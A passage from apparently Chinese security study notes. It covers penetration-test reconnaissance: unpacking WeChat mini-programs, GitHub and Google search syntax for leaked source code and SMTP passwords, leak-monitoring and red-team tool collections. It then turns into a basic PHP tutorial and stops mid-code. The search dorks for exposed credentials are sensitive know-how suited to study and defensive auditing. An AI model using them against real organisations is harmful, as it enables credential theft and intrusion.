id=\"3-提取技术-2\">3.提取技术</h4>\n<ul>\n<li>\n<p><strong>微信路径</strong>：设置-文件管理-路径下/Appiet</p>\n</li>\n<li>\n<p><strong>逆向静态提取</strong>：解包、反编译</p>\n</li>\n<li>\n<p><strong>动态抓包提取</strong>：<code>Proxifier</code>、<code>Burpsuite</code></p>\n</li>\n<li>\n<p><strong>动态调试提取</strong>: 小程序助手、官方开发工具</p>\n</li>\n</ul>\n<h3 id=\"五、微信公众号\">五、微信公众号</h3>\n<ul>\n<li>获取微信公众号途径：<a href=\"https://weixin.sogou.com/\">https://weixin.sogou.com/</a></li>\n<li>微信公众号有无第三方服务</li>\n</ul>\n<h3 id=\"六、其他\">六、其他</h3>\n<h4 id=\"1-Github-监控-开发-配置-源码\">1.Github 监控-开发&amp;配置&amp;源码</h4>\n<ul>\n<li>目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。</li>\n<li><strong>人员&amp;域名&amp;邮箱等筛选</strong>\n<ul>\n<li>eg：<a href=\"http://xxx.cn\">xxx.cn</a> password in: file</li>\n</ul>\n</li>\n<li><strong>Github 资源搜索</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">in:name test               #仓库标题搜索含有关键字</span><br><span class=\"line\">in:descripton test         #仓库描述搜索含有关键字</span><br><span class=\"line\">in:readme test             #Readme文件搜素含有关键字</span><br><span class=\"line\">stars:&gt;3000 test           #stars数量大于3000的搜索关键字</span><br><span class=\"line\">stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键</span><br><span class=\"line\">forks:&gt;1000 test           #forks数量大于1000的搜索关键字 </span><br><span class=\"line\">forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 </span><br><span class=\"line\">size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class=\"line\">pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字</span><br><span class=\"line\">created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字</span><br><span class=\"line\">user:test                  #用户名搜素 </span><br><span class=\"line\">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 </span><br><span class=\"line\">language:java test         #在java语言的代码中搜索关键字 </span><br><span class=\"line\">user:test in:name test     #组合搜索,用户名test的标题含有test的</span><br></pre></td></tr></table></figure>\n<ul>\n<li>关键字配合谷歌搜索</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:Github.com smtp</span><br><span class=\"line\">site:Github.com smtp @qq.com </span><br><span class=\"line\">site:Github.com smtp @126.com</span><br><span class=\"line\">site:Github.com smtp @163.com </span><br><span class=\"line\">site:Github.com smtp @sina.com.cn </span><br><span class=\"line\">site:Github.com smtp password </span><br><span class=\"line\">site:Github.com String password smtp</span><br></pre></td></tr></table></figure>\n<ul>\n<li>语法固定长期后续监控新泄露\n<ul>\n<li>基于关键字监控</li>\n<li>基于项目规则监控</li>\n<li><a href=\"https://github.com/madneal/gshark\">https://github.com/madneal/gshark</a></li>\n<li><a href=\"https://github.com/NHPT/FireEyeGoldCrystal\">https://github.com/NHPT/FireEyeGoldCrystal</a></li>\n<li><a href=\"https://github.com/Explorer1092/Github-Monitor\">https://github.com/Explorer1092/Github-Monitor</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-网盘资源搜索-全局文件机密\">2.网盘资源搜索-全局文件机密</h4>\n<ul>\n<li>主要就是查看网盘中是否存有目标的敏感文件</li>\n<li>如：企业招标，人员信息，业务产品，应用源码等</li>\n</ul>\n<h4 id=\"3-敏感目录文件-目录扫描-爬虫\">3.敏感目录文件-目录扫描&amp;爬虫</h4>\n<ul>\n<li>后续会写</li>\n</ul>\n<h4 id=\"4-网络空间进阶-证书-图标-邮箱\">4.网络空间进阶-证书&amp;图标&amp;邮箱</h4>\n<ul>\n<li>\n<h2 id=\"证书资产\">证书资产</h2>\n</li>\n<li>\n<p>ICO 资产</p>\n<ul>\n<li>fofa、quake、hunter</li>\n</ul>\n</li>\n<li>\n<p>邮箱资产</p>\n<ul>\n<li><a href=\"https://hunter.io/\">https://hunter.io/</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"七、红蓝队工具\">七、红蓝队工具</h3>\n<h4 id=\"1-各类红蓝队优秀工具项目集合\">1.各类红蓝队优秀工具项目集合</h4>\n<ul>\n<li>项目地址：<a href=\"https://github.com/guchangan1/All-Defense-Tool\">https://github.com/guchangan1/All-Defense-Tool</a></li>\n<li>本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大 CMS 利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。</li>\n</ul>\n<h4 id=\"2-自动化-武器库部署-F8x\">2.自动化-武器库部署-F8x</h4>\n<ul>\n<li>\n<p>项目地址：<a href=\"https://github.com/ffffffff0x/f8x\">https://github.com/ffffffff0x/f8x</a></p>\n</li>\n<li>\n<p>介绍：一款红/蓝队环境自动化部署工具, 支持多种场景, 渗透, 开发, 代理环境, 服务可选项等</p>\n</li>\n<li>\n<p>配置：</p>\n<ul>\n<li>\n<p>通过 CF Workers 下载 [推荐]</p>\n<p>wget : wget -O f8x <a href=\"https://f8x.io/\">https://f8x.io/</a></p>\n<p>curl : curl -o f8x <a href=\"https://f8x.io/\">https://f8x.io/</a></p>\n</li>\n</ul>\n</li>\n<li>\n<p>使用：见项目文档</p>\n</li>\n</ul>\n<h4 id=\"3-自动化-网络空间-Asamf\">3.自动化-网络空间-Asamf</h4>\n<ul>\n<li>项目地址：<a href=\"https://github.com/Kento-Sec/AsamF\">https://github.com/Kento-Sec/AsamF</a></li>\n<li>介绍：\n<ul>\n<li>AsamF 集成了 Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF 支持 Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone 配置多个 Key。</li>\n</ul>\n</li>\n<li>配置：\n<ul>\n<li>AsamF 会在~/.config/asamf/目录下生成 config.json 文件。如果你有多个 key，按照 json 的格式录入即可，建议键值按照阿拉伯数字依次录入, 方便以阿拉伯数字来切换 key。自动结果保存在~/asamf/目录下。</li>\n</ul>\n</li>\n<li>使用：见文档</li>\n</ul>\n<h4 id=\"4-自动化-企查信息-ENScan\">4.自动化-企查信息-ENScan</h4>\n<ul>\n<li>项目地址：<a href=\"https://github.com/wgpsec/ENScan_GO\">https://github.com/wgpsec/ENScan_GO</a></li>\n<li>介绍：剑指 HW/SRC，解决在 HW/SRC 场景下遇到的各种针对国内企业信息收集难题</li>\n<li>配置：ENScanGo 在第一次使用时需要使用-v 命令生成配置文件信息后进行配置</li>\n<li>使用：见项目文档</li>\n</ul>\n<h4 id=\"5-综合自动化项目-nemo\">5.综合自动化项目-nemo</h4>\n<ul>\n<li>项目地址：<a href=\"https://github.com/hanc00l/nemo_go\">https://github.com/hanc00l/nemo_go</a></li>\n<li>介绍：Nemo 是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用 Golang 完全重构了原 Python 版本。</li>\n<li>使用：见项目文档</li>\n</ul>\n<h3 id=\"八、思维导图-2\">八、思维导图</h3>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/85f7fd0e7b80e07eb1482c7f15865575.png\" alt=\"85f7fd0e7b80e07eb1482c7f15865575\"></p>\n<h2 id=\"安全开发\">安全开发</h2>\n<h3 id=\"PHP-开发\">PHP 开发</h3>\n<h4 id=\"一、PHP-基础\">一、PHP 基础</h4>\n<ul>\n<li>单引号：直接输出内容</li>\n<li>双引号：解释变量内容</li>\n<li>不加引号：执行内容输出结果</li>\n</ul>\n<h5 id=\"引号对比\">引号对比</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=4;</span><br><span class=\"line\">$b=55;</span><br><span class=\"line\">echo &#x27;$a+$b&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">echo &quot;$a+$b&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">echo $a+$b.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">?&gt; </span><br><span class=\"line\">$a+$b  4+55  59  </span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-变量\">PHP 变量</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数外的变量为全局变量，函数内的变量为局部变量。函数内调用全局变量要用到global关键字。函数外不可以调用局部变量</span><br><span class=\"line\">  &lt;?php</span><br><span class=\"line\">$x=5;</span><br><span class=\"line\">$y=10;</span><br><span class=\"line\"> </span><br><span class=\"line\">function myTest()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    global $x,$y;</span><br><span class=\"line\">    $y=$x+$y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">myTest();</span><br><span class=\"line\">echo $y; // 输出 15</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">  PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。</span><br><span class=\"line\"></span><br><span class=\"line\">上面的实例可以写成这样：</span><br><span class=\"line\">  &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$x=5;</span><br><span class=\"line\"></span><br><span class=\"line\">$y=10;</span><br><span class=\"line\"></span><br><span class=\"line\">function myTest()</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $GLOBALS[&#x27;y&#x27;]=$GLOBALS[&#x27;x&#x27;]+$GLOBALS[&#x27;y&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">myTest();</span><br><span class=\"line\"></span><br><span class=\"line\">echo $y;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">  Static作用域：函数完成后值不会被删除</span><br><span class=\"line\">  &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">function myTest()</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    static $x=0;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $x;</span><br><span class=\"line\"></span><br><span class=\"line\">    $x++;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo PHP_EOL;    // 换行符</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myTest();</span><br><span class=\"line\">myTest();</span><br><span class=\"line\">myTest();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">  参数作用域：传参</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-echo-和-print-语句\">PHP echo 和 print 语句</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo &quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;;</span><br><span class=\"line\">echo &quot;Hello world!&lt;br&gt;&quot;;</span><br><span class=\"line\">echo &quot;我要学 PHP!&lt;br&gt;&quot;;</span><br><span class=\"line\">echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$txt1=&quot;学习 PHP&quot;;</span><br><span class=\"line\">$txt2=&quot;RUNOOB.COM&quot;;</span><br><span class=\"line\">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;$txt1&quot;;</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">echo &quot;在 $txt2 学习 PHP &quot;;</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">$txt1=&quot;学习 PHP&quot;;</span><br><span class=\"line\">$txt2=&quot;RUNOOB.COM&quot;;</span><br><span class=\"line\">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\">print $txt1;</span><br><span class=\"line\">print &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">print &quot;在 $txt2 学习 PHP &quot;;</span><br><span class=\"line\">print &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">print &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\">PHP 很有趣!</span><br><span class=\"line\">Hello world!</span><br><span class=\"line\">我要学 PHP!</span><br><span class=\"line\">这是一个字符串，使用了多个参数。学习 PHP</span><br><span class=\"line\">在 RUNOOB.COM 学习 PHP </span><br><span class=\"line\">我车的品牌是 Volvo学习 PHP</span><br><span class=\"line\">在 RUNOOB.COM 学习 PHP </span><br><span class=\"line\">我车的品牌是 Volvo  </span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-数据类型\">PHP 数据类型</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">$x = 5985;</span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;; </span><br><span class=\"line\">$x = -345; // 负数 </span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;; </span><br><span class=\"line\">$x = 0x8C; // 十六进制数</span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">$x = 047; // 八进制数</span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\"></span><br><span class=\"line\">$x = 10.365;</span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;; </span><br><span class=\"line\">$x = 2.4e3;</span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;; </span><br><span class=\"line\">$x = 8E-5;</span><br><span class=\"line\">var_dump($x);</span><br><span class=\"line\"></span><br><span class=\"line\">$x=true;</span><br><span class=\"line\">$y=false;</span><br><span class=\"line\"></span><br><span class=\"line\">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class=\"line\">var_dump($cars);</span><br><span class=\"line\"></span><br><span class=\"line\">$c = mysql_connect();</span><br><span class=\"line\">echo get_resource_type($c).&quot;\\n&quot;;</span><br><span class=\"line\">// 打印：mysql link</span><br><span class=\"line\"></span><br><span class=\"line\">$fp = fopen(&quot;foo&quot;,&quot;w&quot;);</span><br><span class=\"line\">echo get_resource_type($fp).&quot;\\n&quot;;</span><br><span class=\"line\">// 打印：file</span><br><span class=\"line\"></span><br><span class=\"line\">$doc = new_xmldoc(&quot;1.0&quot;);</span><br><span class=\"line\">echo get_resource_type($doc-&gt;doc).&quot;\\n&quot;;</span><br><span class=\"line\">// 打印：domxml document</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-类型比较\">PHP 类型比较</h5>\n<ul>\n<li>虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较\n<ul>\n<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>\n<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>\n<li>例如，“42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"PHP-常量\">PHP 常量</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span> <span class=\"title function_ invoke__\">define</span> ( <span class=\"keyword\">string</span> <span class=\"variable\">$name</span> , <span class=\"keyword\">mixed</span> <span class=\"variable\">$value</span> [, <span class=\"keyword\">bool</span> <span class=\"variable\">$case_insensitive</span> = <span class=\"literal\">false</span> ] )</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 不区分大小写的常量名</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;GREETING&quot;</span>, <span class=\"string\">&quot;欢迎访问 Runoob.com&quot;</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> greeting;  <span class=\"comment\">// 输出 &quot;欢迎访问 Runoob.com&quot;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-字符串\">PHP 字符串</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">并置运算符（.）</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$txt1</span>=<span class=\"string\">&quot;Hello world!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$txt2</span>=<span class=\"string\">&quot;What a nice day!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$txt1</span> . <span class=\"string\">&quot; &quot;</span> . <span class=\"variable\">$txt2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">strlen</span>() 函数：返回字符串长度。</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">strlen</span>(<span class=\"string\">&quot;Hello world!&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">strpos</span>()： 函数用于在字符串内查找一个字符或一段指定的文本。</span><br><span class=\"line\"></span><br><span class=\"line\">如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 <span class=\"literal\">FALSE</span>。</span><br><span class=\"line\"></span><br><span class=\"line\">下面的实例在字符串 <span class=\"string\">&quot;Hello world!&quot;</span> 中查找文本 <span class=\"string\">&quot;world&quot;</span>：</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">strpos</span>(<span class=\"string\">&quot;Hello world!&quot;</span>,<span class=\"string\">&quot;world&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">  字符串中第一个字符的位置是 <span class=\"number\">0</span>，而不是 <span class=\"number\">1</span>。</span><br></pre></td></tr></table></figure>\n<h5 id=\"条件语句\">条件语句</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (条件)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    条件成立时要执行的代码;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (条件)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">条件成立时执行的代码;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">条件不成立时执行的代码;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (条件)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> 条件成立时执行的代码;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">elseif</span> (条件)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elseif</span> 条件成立时执行的代码;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    条件不成立时执行的代码;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> (n)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">case</span> label1:</span><br><span class=\"line\"></span><br><span class=\"line\">    如果 n=label1，此处代码将执行;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">case</span> 